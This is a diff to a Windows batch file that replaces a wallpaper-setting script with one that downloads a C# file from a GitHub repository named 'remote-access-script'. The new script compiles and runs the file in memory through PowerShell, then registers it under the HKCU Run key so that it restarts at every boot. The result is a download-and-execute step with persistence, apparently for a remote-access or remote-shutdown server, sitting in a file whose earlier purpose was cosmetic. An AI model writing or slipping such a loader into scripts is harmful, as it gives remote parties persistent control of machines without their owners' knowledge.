@@ -1,15 +1,40 @@
 @echo off
-:: Set wallpaper image path
-set WALLPAPER_PATH="D:\images.jpg"
+:: Set variables
+set URL=https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/ShutdownServer.cs
+set FOLDER=C:\log
+set FILE=%FOLDER%\ShutdownServer.cs
+set PS_SCRIPT=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
 
-:: Set the registry key to change the wallpaper
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %WALLPAPER_PATH% /f
+:: Create folder if it doesn't exist
+if not exist "%FOLDER%" mkdir "%FOLDER%"
 
-:: Set the wallpaper style to "Fill" (other options: 0 = Centered, 2 = Stretched, 6 = Fit)
-reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+:: Download the C# script using PowerShell
+echo Downloading ShutdownServer.cs...
+powershell -Command "Invoke-WebRequest -Uri %URL% -OutFile %FILE%"
+if %ERRORLEVEL% neq 0 (
+    echo Failed to download the file. Exiting...
+    exit /b
+)
 
-:: Refresh the desktop to apply the change
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+:: Run the C# script using PowerShell without the need for compiling
+echo Running ShutdownServer.cs...
+powershell -Command "& {Add-Type -Path '%FILE%'; [ShutdownServer]::Start()}"
+if %ERRORLEVEL% neq 0 (
+    echo Failed to run the C# script. Exiting...
+    exit /b
+)
 
-echo Wallpaper has been changed.
-pause
+:: Add it to the startup registry so it runs on reboot
+echo Adding to startup...
+set REGKEY="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+set REGVAL="ShutdownServer"
+set REGPATH="%PS_SCRIPT% -Command \"& {Add-Type -Path '%FILE%'; [ShutdownServer]::Start()}\""
+
+reg add %REGKEY% /v %REGVAL% /t REG_SZ /d "%REGPATH%" /f
+if %ERRORLEVEL% neq 0 (
+    echo Failed to add to startup. Exiting...
+    exit /b
+)
+
+echo Setup complete. The server will start automatically on system startup.
+exit
